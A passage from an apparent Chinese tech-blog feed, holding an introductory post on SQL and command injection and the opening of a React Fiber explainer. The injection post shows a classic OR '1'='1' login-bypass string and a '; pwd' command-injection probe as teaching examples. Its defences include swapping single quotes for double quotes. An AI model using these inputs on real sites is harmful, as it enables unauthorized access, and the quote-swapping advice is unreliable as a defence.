id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)\">#</a> 零基礎資安系列（二）- 認識 XSS(Cross-Site Scripting)</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">認識 XSS（Cross-Site Scripting）</a></p>\n</blockquote>\n<h4 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89\">#</a> 零基礎資安系列（四）- 認識注入攻擊（ Injection Attack）</h4>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-injectionattack\">認識注入攻擊（ Injection Attack）</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h2>\n<h3 id=\"owasp-path-traversal\"><a class=\"direct-link\" href=\"#owasp-path-traversal\">#</a> OWASP Path Traversal</h3>\n<blockquote>\n<p><a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">https://owasp.org/www-community/attacks/Path_Traversal</a></p>\n</blockquote>\n<h3 id=\"wikipedia-path-traversal\"><a class=\"direct-link\" href=\"#wikipedia-path-traversal\">#</a> Wikipedia Path Traversal</h3>\n<blockquote>\n<p><a href=\"https://en.wikipedia.org/wiki/Directory_traversal_attack\">https://en.wikipedia.org/wiki/Directory_traversal_attack</a></p>\n</blockquote>\n",
      "date_published": "2021-05-30T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-injectionattack/",
      "title": "零基礎資安系列（四）-認識注入攻擊（ Injection Attack）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>想像今天有個路人突然出現在你面前，拿著一管針筒不由分說的就要往你身上戳，相信正常人的第一反應要嘛拔腿就跑要嘛阻止他，但如果今天你沒想到會有這種狀況，不小心讓他注入成功會發生甚麼事？雖然有很多種可能，但相信我，那一定不會是甚麼好事。</p>\n</blockquote>\n<p>今天想和大家聊聊常出現在網頁安全風險榜單上的常客，<strong>注入攻擊（ Injection Attack）</strong>，聊聊這種風險到底是如何的危險，居然可以長年高居風險榜單的前三甲，如果我們的網站真的不幸被注入成功了，會導致甚麼樣的後果？如果真的這麼可怕的話，我們有沒有甚麼辦法可以阻止這種攻擊呢？在看完今天的文章之後，其實你會發現，原來這些攻擊離我們這麼近。</p>\n<!-- summary -->\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p1.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827\">https://www.informationsecurity.com.tw/article/article_detail.aspx?aid=8827</a></strong></p>\n<p>注入攻擊並不僅僅是指大家耳熟能詳，針對資料庫相關網頁應用程式/服務攻擊的 SQL Injection，其中也包括了植入惡意 shell 指令到網站主機作業系統的 Command Injection ，甚至之前曾介紹過的 XSS 攻擊也是屬於注入攻擊的一種。</p>\n<p>也因此，我想藉由這個機會跟大家介紹在 Injection 中比較容易被攻擊者發現並利用的兩種 Injection ： SQL Injection ＆ Command Injection</p>\n<p>（如果對 <a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">XSS 攻擊</a> 有興趣的小夥伴可以看我之前的 XSS 介紹文章喔）</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E7%AD%96%E7%95%A5\">#</a> 常見的攻擊策略</h3>\n<p>先說常見的攻擊策略，這應該是所有 Injection 都通用的，而針對 Injection 攻擊策略大致分為兩種 ，一種是所謂的盲注攻擊（ Blindfolded Injection），相當於攻擊者直接在大街上拿著針筒對你進行衝鋒，優點是不需要太多的準備和成本，只要無腦對網站塞入常見的注入範本就可以，不過也因為如此，所以成功機率偏低，畢竟大街上拿著針筒衝鋒被阻止的機率實在是有夠高的啦。</p>\n<p>第二種的話，攻擊者會藉由網站的錯誤訊息及意外洩漏的系統資訊，對網站進行針對式的注入，而這種攻擊策略其實通俗點的說法就是預謀殺人，藉由調查受害者的公司和住家以及上下班路線，接著埋伏拿著針筒對受害者進行注射，聽起來成功率就比第一種高多了，對吧？不過也因為這樣，所以攻擊者必須要耗費成本對網站進行資料收集，再把資料進行分析之後設計針對式的注入樣本，攻擊者才能進行攻擊，非常的耗費時間。</p>\n<p>不過根據我自身的經驗，其實目前的攻擊者通常是採取綜合式的攻擊策略，先用 Open Source 的弱點掃描工具對許多目標網站進行掃描，接著針對防禦最不完整的幾個網站進行盲注攻擊，再依據結果挑選成功可能性最高的目標網站進行針對性的攻擊設計，就像是拿著針筒對路上的每個人進行衝鋒，看起來反應最慢或是最沒反應的那幾個人，就會成為攻擊者的目標。</p>\n<p>而攻擊者利用注入攻擊的目的可以大致分類為三種，提權、獲取敏感資料、竄改資料，接下來我會在介紹攻擊的同時向大家說明當攻擊者達成以上三種任一目的時可能會產生的安全風險。</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E6%94%BB%E6%93%8A%E4%BB%8B%E7%B4%B9\">#</a> 常見的攻擊介紹</h3>\n<h4 id=\"sql-injection\"><a class=\"direct-link\" href=\"#sql-injection\">#</a> SQL Injection</h4>\n<p>SQL Injection 應該是屬於 Injection 界中無人不知無人不曉的名人了，以一個最常見的 SQL Injection 範本來舉例說明，當一個網站有帳號密碼必須輸入時，攻擊者在帳號／密碼的欄位輸入 admin／ admin 接著系統提示，密碼錯誤，於是攻擊者可以得知，有 admin 這個帳號，但是密碼錯誤，於是攻擊者便在密碼的欄位嘗試輸入 <code>”password’ OR ‘1’=’1&quot;</code> ，如果這個網站的資料庫語法是 <code>UserList.Password = ‘Password’</code> 而且沒有限制輸入的話，整串驗證會變成 <code>UserList.Password = ‘password’ OR ‘1’=’1'</code> ，也就是說 ”Password”被當成了某個空白或者不重要的字串，而1 = 1 是 True 邏輯又是成立的，於是當帳號和密碼都是 True 的時候，會發生甚麼事呢？沒錯！攻擊者就可以以 admin 的權限登入網站為所欲為！</p>\n<p>如果以更生活化的例子來說明， SQL Injection 的原理其實就像是 PTT 的簽名檔裡常看到的扭曲意義推文一樣，舉例來說：</p>\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html\">https://www.ptt.cc/bbs/joke/M.1418702977.A.BEF.html</a></strong></p>\n<p>同樣的，攻擊者也是變更了資料庫中語法的意義，讓資料庫輸出了攻擊者想看到的結果，進而達成目的，除了可能造成剛剛說明的提權，導致攻擊者獲得 admin 權限以外， SQL Injection 也可能造成資料庫資料表中的資料外洩，例如企業及個人機密資料、帳戶資料、密碼等，甚至使攻擊者竄改網站，在網站加入惡意連結、惡意程式使企業商譽遭到破壞。</p>\n<h4 id=\"command-injection\"><a class=\"direct-link\" href=\"#command-injection\">#</a> Command Injection</h4>\n<p>雖然 Command Injection 相較於 SQL Injection 並沒有那麼有名氣，但他造成的風險卻完全不遑多讓， Command Injection 簡單來說就是當攻擊者的惡意輸入被誤認為作業系統指令時就會發生指令注入，舉例來說，某網站的查詢欄位可以查詢資料，而攻擊者為了驗證網站是不是屬於 Linux 的系統，於是故意在查詢的內容中加上 ; 並輸入指令 pwd ，由於Linux可以利用分號來同時提交多個不同的指令，再加上 pwd 指令是可以用來顯示目前所在目錄</p>\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p3.jpeg\" alt=\"\"><br>\n<img src=\"/img/posts/jo/zerobased-injectionattack/p4.jpeg\" alt=\"\"><br>\n<strong>photo by <a href=\"http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html\">http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html</a></strong></p>\n<p>當上面的範例能夠確認指令被成功執行之後，對攻擊者的限制就只剩下攻擊者的想像力夠不夠了，例如攻擊者可以列出所有 Server 的目錄，查詢有價值的敏感資料，開放 Server 的服務，使 Server 變成攻擊者的跳板，放入勒索軟體或是後門等，為所欲為。</p>\n<h3 id=\"%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87\">#</a> 防範 Injection 的準則</h3>\n<p>相信以上的說明有讓各位小夥伴更加了解 Injection 到底是甚麼樣的攻擊以及 Injection 究竟可以造成甚麼樣的危害，那現在就讓我們來聊聊要怎麼樣才能不被針筒戳到。</p>\n<p>1. 使用正則表達式過濾使用者的輸入值以及包含在參數中的惡意程式，把輸入值中所有的單引號全部更改為雙引號，確保資料的輸入無論是有意或無意都不會因此被網站視為程式輸入。</p>\n<p>2. 限制輸入的字元格式不包含特殊符號，並確認欄位的合理輸入長度，例如出生年月日的欄位沒有必要開放到20個字元以上。</p>\n<p>3. 把系統及資料的使用者帳號權限最小權限化，避免攻擊者萬一獲取了某一個使用者的權限就等於獲得了可以讀寫的所有權限。</p>\n<p>4. 不要將系統或資料庫錯誤顯示於網頁之上，盡量避免透漏 Server 及資料庫的系統或是版本，以防自身網站成了攻擊者針對的目標。</p>\n<h3 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h3>\n<p><strong>Injection</strong> 會這麼猖獗的原因在於要控制網站中每一個欄位的輸入以及 Server 和資料庫的系統或是版本是不是最新的，因為很有可能因為網站更新導致新增的欄位沒有設定驗證，或是 Server 和資料庫的系統及版本出現漏洞沒有即時更新，加上不同程式語言有不同輸入和檢查，加上 Injection 攻擊的成本不高，使得相關的攻擊層出不窮，因此，除了以上的四種方法以外，建議網站在合理的預算下進行定期的網站檢測，除了可以預防 Injection 以外，也能發現許多開發者非預期的風險發生。</p>\n<h3 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h3>\n<h4 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> 零基礎資安系列（二）- 認識 XSS（Cross-Site Scripting）</h4>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">認識 XSS（Cross-Site Scripting）</a></p>\n</blockquote>\n<h3 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h3>\n<h4 id=\"sql%E6%B3%A8%E5%85%A5\"><a class=\"direct-link\" href=\"#sql%E6%B3%A8%E5%85%A5\">#</a> SQL注入</h4>\n<blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/SQL%E6%B3%A8%E5%85%A5\">https://zh.wikipedia.org/wiki/SQL注入</a></p>\n</blockquote>\n<h4 id=\"command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA\"><a class=\"direct-link\" href=\"#command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA\">#</a> Command Injection運作原理與解說</h4>\n<blockquote>\n<p><a href=\"http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html\">http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html</a></p>\n</blockquote>\n",
      "date_published": "2021-05-29T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "url": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "title": "隱藏在 React 下的機制： Fiber",
      "content_html": "<p>不知不覺都 2021 年中了，從 React 16.3 的重大更新後也已經過了兩年多了，不知到大家還記不記得當時的兩大重要功能，其一為 Function Component ( hooks )，另一個大家比較不那麼熟悉但卻也很重要的則應該屬 Fiber 架構，但其實會有 hook 的設計也是也是因為上述架構的關係。</p>\n<p>在當時引想大家最多的應該屬生命週期的變換，不曉得大家是否還記得當時最常用到的生命週期 <code>componentWillUpdate</code>/<code>componentWillReceiveProps</code> 將被廢除時驚訝的心情? 而當時也加入了兩個新的 lifecycle 來解決以上問題。</p>\n<ul>\n<li>getDerivedStateFromProps</li>\n<li>getSnapshotBeforeUpdate</li>\n</ul>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p1.png\" alt=\"Re: React 常用的生命週期(1)\"><br>\n<a href=\"https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p>\n<p>至於為什麼會產生以下的變化呢？這就要說說本次的主題 Fiber 了。</p>\n<h2 id=\"fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\"><a class=\"direct-link\" href=\"#fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\">#</a> Fiber 是什麼</h2>\n<p>Fiber 屬於更為底層的抽象行為，目的是為了達到以下幾種功能</p>\n<ul>\n<li>幫不同類型的工作分配優先順序</li>\n<li>暫停工作，稍後回來</li>\n<li>當不需要工作時取消</li>\n<li>重新使用已經完成的工作</li>\n</ul>\n<!-- summary -->\n<p>在尚未使用 Fiber 前，由於畫面更新前須由 reconciler ( React ) 調度完後才會送到 renderer，且當畫面複雜時，更動一個 state 狀態時也需要將底下的所有子元件重新 render 出一份 virtual dom，而在過去這個部分全部只由一個主線程去做同步式渲染，因此當有一個 Component 需要費時較多時間時，將會把主線程 block，當時間一長，就有可能導致來不及更新至指定時間範圍內，造成無法順利渲染，會有不順暢的情況發生。</p>\n<!-- summary -->\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p2.png\" alt=\"Re: sync mode 和 async mode 的差異\"><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a></p>\n<h2 id=\"fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\"><a class=\"direct-link\" href=\"#fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\">#</a> Fiber 的產生及作用</h2>\n<p>為了解決此問題，React 制定了 fiber 的結構，利用非同步的渲染方式來解決，將各元件拆解，也避免了長時間占用主線程所導致卡頓的問題。 ( 所使用的 <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Window/requestIdleCallback\">API</a>， <a href=\"https://github.com/facebook/react/blob/4c7036e807fa18a3e21a5182983c7c0f05c5936e/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1541\">source code</a> )</p>\n<p>傳統 React 更新時會分成兩個時期</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p3.png\" alt=\"Re: React 更新時期\"></p>\n<ul>\n<li>reconciliation / render 階段 ( 判斷哪先元件需要更新，可中斷 )</li>\n<li>commit 階段 ( 插入、移動、刪除節點，不可中斷 )</li>\n</ul>\n<!--（有誤 需更正） commit phase 的執行很快，而 render phase 產生真實 DOM 的時間卻很久，因此在 react 更新元件時可能會中斷更新以避免阻塞瀏覽器，也代表可能會因為被中斷而重新執行，所以必須保持沒有 side effect 的情況來避免非預期的情況。 -->\n<p>reconciliation phase 會先通過 render 更新元件，在第一次實建立 Fiber 節點，並在之後更新與上一次所渲染的 DOM 比較，因此在 render 階段將執行以下生命週期方法判斷是否有更新：</p>\n<ul>\n<li>componentWillMount (已廢棄)</li>\n<li>componentWillReceiveProps (已廢棄)</li>\n<li>componentWillUpdate (已廢棄)</li>\n<li>getDerivedStateFromProps</li>\n<li>shouldComponentUpdate</li>\n</ul>\n<p>react 可以根據目前的狀況調整，可以選擇一次處理單個或者多個 fiber 並且調整優先權，因此可以異步執行及中斷，但也因為如此，內部的邏輯必須避免 side effect。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p4.png\" alt=\"Re: Commit phrase 和 render phrase\"></p>\n<p>在 render 階段執行完後將會產生包含著 side effect 的 fiber 節點樹，而 side effect 事實上就是 commit 階段所需要更新操作，會在執行 commit 階段時輪詢 side effect 列表去對 DOM 進行修改。</p>\n<p>以下是commit階段執行的生命週期方法列表：</p>\n<ul>\n<li>getSnapshotBeforeUpdate</li>\n<li>componentDidMount</li>\n<li>componentDidUpdate</li>\n<li>componentWillUnmount</li>\n</ul>\n<p>因為這些方法在同步commit階段執行，所以它們可能包含副作用或更動 DOM。</p>\n<p>而前面說到被廢除的兩個 lifecycle 因為是屬於 render phase，有機會被多次執行，為了避免 side effect 發生，才會移除此 lifecycle。</p>\n<ul>\n<li><code>componentWillUpdate</code></li>\n<li><code>componentWillReceiveProps</code></li>\n</ul>\n<p>而拿掉以上 API 後則利用 <code>getDerivedStateFromProps</code> 來取代 <code>componentWillReceiveProps</code>，但由於 <code>getDerivedStateFromProps</code> 被設計成靜態函數，不用擔心 side effect 所帶來的影響，不過要避免從 props 等等去觸發 side effect。</p>\n<h2 id=\"fiber-nodes-%E5%92%8C-fiber-tree\"><a class=\"direct-link\" href=\"#fiber-nodes-%E5%92%8C-fiber-tree\">#</a> Fiber nodes 和 Fiber tree</h2>\n<p>在 reconciliation 時，每個 component 的 render 方法回傳的資料都會合併到 Fiber tree 中，每個React元素都有一個對應的 Fiber nodes，用來記錄對應的工作內容，而特別的地方在於在每次 render 時不會重新產生 Fiber node。</p>\n<p>更確切的說，每個 Fiber 就是一個 worker ，提供了跟踪，調度，暫停和中止工作的方法。</p>\n<p>每一個 Fiber Node 節點與 Virtual Dom 對應，所有 Fiber Node 連接起來形成 Fiber tree，為單向連結串列的樹狀結構：<br>\n<img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p5.png\" alt=\"Re: Fiber tree\"></p>\n<p>主要是為了將原本的樹狀遞迴輪詢轉變成循環輪詢，配合 requestIdleCallback API, 實現任務拆分、中斷與恢復。</p>\n<p>大概結構如下：</p>\n<pre class=\"language-js\"><code class=\"language-js\">type Fiber <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// 標籤類型</span><br>  tag<span class=\"token operator\">:</span> TypeOfWork<span class=\"token punctuation\">,</span><br><br>  key<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">|</span> string<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 與 Fiber 所關聯的類型</span><br>  type<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// local 狀態</span><br>  stateNode<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 以下區塊負責處理 Fiber</span><br><br>  <span class=\"token keyword\">return</span><span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 單向連結串列結構</span><br>  child<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  sibling<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  index<span class=\"token operator\">:</span> number<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br><br>  <span class=\"token comment\">// 輸出用的狀態</span><br>  memoizedState<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br>  <span class=\"token comment\">// 紀錄在單向鏈結串列中的下一個 Fiber </span><br>  nextEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 子樹中具有 side effect 的第一個和最後一個光纖</span><br>  <span class=\"token comment\">// 當我們重用已完成的工作時，我們重用 link list 的一部分</span><br>  firstEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  lastEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// 快速確定子樹是否沒有正在等待的更動</span><br>  pendingWorkPriority<span class=\"token operator\">:</span> PriorityLevel<span class=\"token punctuation\">,</span><br><br><br>  <span class=\"token comment\">// 如果工作在光纖上進行，而該光纖已經在較低的優先權開始了一部分工作</span><br>  <span class=\"token comment\">// 那麼我們需要將已完成的工作儲存著。直到我們需要重新開始處理它為止</span><br>  <span class=\"token comment\">// 它可能與 \"目前\" 的 child 不同。</span><br>  progressedChild<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在這結構中，nextEffect / firstEffect / lastEffect 將在後面的章節 ( Effect List ) 中表現出相當的重要性。</p>\n<h2 id=\"workinprogress-tree\"><a class=\"direct-link\" href=\"#workinprogress-tree\">#</a> workInProgress tree</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">createWorkInProgress</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">current<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <br>    <span class=\"token keyword\">let</span> workInProgress <span class=\"token operator\">=</span> current<span class=\"token punctuation\">.</span>alternate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>workInProgress <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        workInProgress <span class=\"token operator\">=</span> <span class=\"token function\">createFiber</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token operator\">...</span><br>    workInProgress<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> current<span class=\"token punctuation\">;</span><br>    current<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> workInProgress<span class=\"token punctuation\">;</span><br>    <span class=\"token operator\">...</span><br>    <span class=\"token keyword\">return</span> workInProgress<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiber.new.js#L254\">source code</a></p>\n<p>React 在第一次 render 時會將各節點紀錄為 Fiber Tree，而在之後檢查時會建立一個 workInProgress tree ，等待 workInProgress tree 完成後就會被當作 current tree，而此稱為<code>雙緩衝技術</code> (double buffering)。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p6.png\" alt=\"\"><br>\n<a href=\"https://www.youtube.com/watch?v=ZCuYPiUIONs&amp;t=1040s\">source video</a></p>\n<h2 id=\"effect-list\"><a class=\"direct-link\" href=\"#effect-list\">#</a> Effect List</h2>\n<p>在上一張圖中，有標記標籤的元件是需要 side effect 進行處理的，為了達到高效的處理，因此需要將原本的樹狀咧表轉換為線性列表，才能夠快速的遍歷，除此之外還會省略沒有 side effect 的節點，流程如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p7.png\" alt=\"\"></p>\n<p>順序的部分是從子到父的方式去執行，在各個階段如果為該層結構<strong>第一個節點</strong>會記錄在 firstEffect，其後則會記錄在 nextEffect 當中，並會在父層級將其合併起來並將自己綁入 lastEffect ，並向上傳遞，遇到沒有 effect 的節點會直接向上傳遞而不進行更動，最後將所有順序傳遞至 Root 層建立出如下圖的 effect list。</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p8.png\" alt=\"Re: Effect list\"><br>\n<a href=\"https://youtu.be/ZCuYPiUIONs?t=1373\">source video</a></p>\n<h2 id=\"render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\"><a class=\"direct-link\" href=\"#render-%E9%9A%8E%E6%AE%B5%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%BE%AA%E7%92%B0\">#</a> Render 階段的工作循環</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">workLoop</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">isYieldy</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>isYieldy<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush work without yielding</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// Flush asynchronous work until the deadline runs out of time.</span><br>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nextUnitOfWork <span class=\"token operator\">!==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">shouldYield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      nextUnitOfWork <span class=\"token operator\">=</span> <span class=\"token function\">performUnitOfWork</span><span class=\"token punctuation\">(</span>nextUnitOfWork<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>在上面<a href=\"https://github.com/facebook/react/blob/f765f022534958bcf49120bf23bc1aa665e8f651/packages/react-reconciler/src/ReactFiberScheduler.js#L1136\">程式碼</a>中，nextUnitOfWork 存有 workInProgress 樹中的 Fiber nodes。當 React 輪詢 Fiber tree 時，它會使用這個變量來知曉是否有任何其他 Fiber nodes 具有未完成的工作。目前的 Fiber 處理完後，nextUnitOfWork 會指向下一個 Fiber node 或者 null (結束)。</p>\n<p>輪詢 Fiber trees 主要根據以下四個功能：</p>\n<ul>\n<li>performUnitOfWork</li>\n<li>beginWork</li>\n<li>completeUnitOfWork</li>\n<li>completeWork</li>\n</ul>\n<p>執行順序參考如下圖：</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p9.gif\" alt=\"\"><br>\n<a href=\"https://images.indepth.dev/images/2019/08/tmp2.gif\">source image</a></p>\n<p>由於透過了深度優先搜尋(DFS)，整個流程會優先執行底部 child node 的工作，最後才會到 parent node。</p>\n<h2 id=\"commit-%E9%9A%8E%E6%AE%B5\"><a class=\"direct-link\" href=\"#commit-%E9%9A%8E%E6%AE%B5\">#</a> Commit 階段</h2>\n<p>在這個階段，React 會將 render phase 所產生的 workInProgress tree 轉移到 current tree，並執行 render phase 所比對所產生的 Effect list，此步驟將會有更新 Dom 的節點等等的操作，假如有不需更新的項目將不會包含在 Effect list 中，所以不會被 commit 